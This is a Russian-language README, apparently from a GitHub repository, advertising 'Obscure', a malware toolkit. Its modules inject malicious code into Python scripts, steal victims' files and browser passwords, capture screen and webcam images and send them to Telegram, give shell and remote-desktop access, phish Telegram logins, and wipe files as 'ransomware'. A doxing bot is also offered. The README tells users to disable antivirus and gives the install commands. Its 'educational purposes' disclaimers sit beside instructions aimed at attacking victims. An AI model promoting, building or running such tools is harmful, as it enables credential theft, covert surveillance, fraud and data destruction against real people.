# 💿 **Obscure v0.0.5 GH-ALPHA**
_Пофикшены баги._
_Новые фичи. (PCcontrol, R4Id+, обфусцирование base64 x zlib x marshal, EXE compiling)_

# 📦 **Внедряемые вирусные коды**
⚠️ Все описанное здесь не является призывом к действию! 
Создано в образовательных целях.

⚠️ Некоторые антивирусы могут помешать работе Obscure.
Советую отключить антивирус на время пользования.

**Obscure Implementer**
Это зверь для внедрения вредоносного кода 
в скрипты python.

**R4Id и R4id+**
R4Id - Собирает файлы жертвы и отправляет в телеграм.
R4Id+ - При запуске на Windows захватывает экран и
делает шот с веб камеры. Крадет пароли с браузеров:
Chrome и Firefox.
R4Id+ При запуске на Termux предоставляет доступ к консоли. 
Все еще в разработке.

**HiFiles**
HiFiles - Предоставит тебе простой и мгновенный
доступ к файловой системе жертвы.

**InterGram**
InterGram - Жертва вводит данные своего телеграм аккаунта.
Данные отправляются тебе.

**ExSystemKiller**
ExSystemKiller - Является вирусом вымогателем, стирает все файлы жертвы.

**PCcontrol**
PCcontrol - Простой тул удаленного доступа к ПК.
Предоставляет широкий функционал.

# 🧑🏻‍💻 **Бот Obscure Engine**
**Obscure Engine**
Пробив осуществляется через официального бота Obscure Engine.
Никто не гарантирует что необходимая информация будет найдена!
Пожалуйста, используйте это в образовательных целях.
```tg: t.me/obscure_dbot```

Дальше — больше. Жди обновлений.

# ✋ **Перед использованием**
```pip install -r obscure.txt```
```python obscure.py```

# ⚠️ **Важное**
За все свои действия, ТЫ несешь ответственность.
